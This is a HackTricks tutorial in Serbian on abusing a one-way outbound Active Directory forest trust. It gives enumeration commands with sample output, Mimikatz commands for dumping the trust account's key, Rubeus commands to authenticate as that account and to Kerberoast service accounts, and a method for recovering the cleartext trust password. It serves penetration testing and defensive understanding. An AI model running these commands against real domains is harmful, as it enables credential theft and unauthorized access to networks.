# Spoljni šumski domen - Jednosmerna (izlazna)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

U ovom scenariju **vaš domen** poverava neke **privilegije** principu iz **različitih domena**.

## Enumeracija

### Izlazno poverenje
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Napad na nalog poverenja

Postoji sigurnosna ranjivost kada se uspostavi poverenje između dva domena, ovde identifikovanih kao domen **A** i domen **B**, gde domen **B** proširuje svoje poverenje na domen **A**. U ovom postavci, poseban nalog se kreira u domenu **A** za domen **B**, koji igra ključnu ulogu u procesu autentifikacije između ova dva domena. Ovaj nalog, povezan sa domenom **B**, koristi se za enkripciju karata za pristup uslugama preko domena.

Ključno je razumeti da se lozinka i heš ovog posebnog naloga mogu izvući sa kontrolera domena u domenu **A** korišćenjem alata komandne linije. Komanda za izvođenje ove radnje je:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ova ekstrakcija je moguća jer je nalog, identifikovan sa **$** nakon svog imena, aktivan i pripada grupi "Domain Users" domena **A**, te stoga nasleđuje dozvole povezane sa ovom grupom. Ovo omogućava pojedincima da se autentifikuju protiv domena **A** koristeći akreditive ovog naloga.

**Upozorenje:** Moguće je iskoristiti ovu situaciju kako bi se stekao oslonac u domenu **A** kao korisnik, iako sa ograničenim dozvolama. Međutim, ovaj pristup je dovoljan za sprovođenje enumeracije na domenu **A**.

U scenariju gde je `ext.local` domen koji veruje i `root.local` je povereni domen, korisnički nalog nazvan `EXT$` bi bio kreiran unutar `root.local`. Kroz određene alate, moguće je izvršiti iskopavanje Kerberos ključeva poverenja, otkrivajući akreditive `EXT$` u `root.local`. Komanda za postizanje ovoga je:
```bash
lsadump::trust /patch
```
Nakon toga, moglo bi se koristiti izvučeni RC4 ključ za autentifikaciju kao `root.local\EXT$` unutar `root.local` korišćenjem druge alatke komande:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Ovaj korak autentifikacije otvara mogućnost za enumeraciju i čak eksploataciju servisa unutar `root.local`, kao što je izvođenje Kerberoast napada radi izvlačenja kredencijala servisnog naloga korišćenjem:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Prikupljanje lozinke poverenja u čistom tekstu

U prethodnom toku korišćen je heš poverenja umesto **lozinke u čistom tekstu** (koja je takođe **izvučena pomoću alata mimikatz**).

Lozinka u čistom tekstu može se dobiti konvertovanjem izlaza \[ CLEAR ] iz mimikatz-a iz heksadecimalnog oblika i uklanjanjem nultih bajtova ‘\x00’:

![](<../../.gitbook/assets/image (935).png>)

Ponekad prilikom kreiranja poverenja, korisnik mora uneti lozinku za poverenje. U ovom prikazu, ključ je originalna lozinka poverenja i stoga je čitljiva čoveku. Kako ključ rotira (svakih 30 dana), lozinka u čistom tekstu neće biti čitljiva čoveku, ali tehnički i dalje upotrebljiva.

Lozinka u čistom tekstu može se koristiti za obavljanje redovne autentifikacije kao nalog poverenja, kao alternativa zahtevanju TGT-a korišćenjem Kerberos tajnog ključa naloga poverenja. Ovde, upit root.local sa ext.local za članove Domain Admins:

![](<../../.gitbook/assets/image (789).png>)

## Reference

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Naučite hakovanje AWS-a od početka do naprednog nivoa sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
